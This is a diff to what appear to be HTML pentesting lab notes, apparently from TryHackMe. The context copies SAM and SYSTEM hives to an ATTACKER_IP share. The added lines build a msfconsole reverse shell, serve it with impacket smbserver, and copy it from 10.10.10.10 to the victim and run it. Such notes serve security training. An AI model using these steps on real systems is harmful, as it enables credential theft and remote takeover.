@@ -24,6 +24,14 @@
 <p><span style="font-size: 24px;">C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\&nbsp;</span></p>
 <p><span style="font-size: 24px;">C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\ &nbsp;</span></p>
         <p><span style="font-size: 24px;"><br></span></p>
+        <p><span style='font-size: 24px; font-family: "Times New Roman", Times, serif;'><strong><u><span style="color: rgb(184, 49, 47);">Another way: SMBServer - copy from attacking to victim</span></u></strong></span></p>
+<p><span style='font-size: 24px; font-family: "Times New Roman", Times, serif;'>- Create the reverse shell exe using msfconsole</span></p>
+<p><span style='font-size: 24px; font-family: "Times New Roman", Times, serif;'>- in same directory, start up the smb server</span></p>
+<p><span style='font-size: 24px; font-family: "Times New Roman", Times, serif;'><code>sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .</code></span></p>
+<p><span style='font-size: 24px; font-family: "Times New Roman", Times, serif;'><code>- run on windows: copy the exe (transfer over)</code></span></p>
+<p><span style='font-size: 24px; font-family: "Times New Roman", Times, serif;'><code>copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe </code></span></p>
+<p><span style='font-size: 24px; font-family: "Times New Roman", Times, serif;'>- start the exe</span></p>
+<p><span style='font-size: 24px; font-family: "Times New Roman", Times, serif;'>C:\PrivEsc\reverse.exe </span></p>
         <p><span style="font-size: 24px;"><strong><span style="color: rgb(147, 101, 184);"><u>Python Server and SCP</u></span></strong></span></p>
         <p><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);">How to start a python server</span></span></p>
         <p><span style="font-size: 24px;"><span style="color: rgb(0, 0, 0);"><strong>python3 -m http.server</strong></span></span></p>
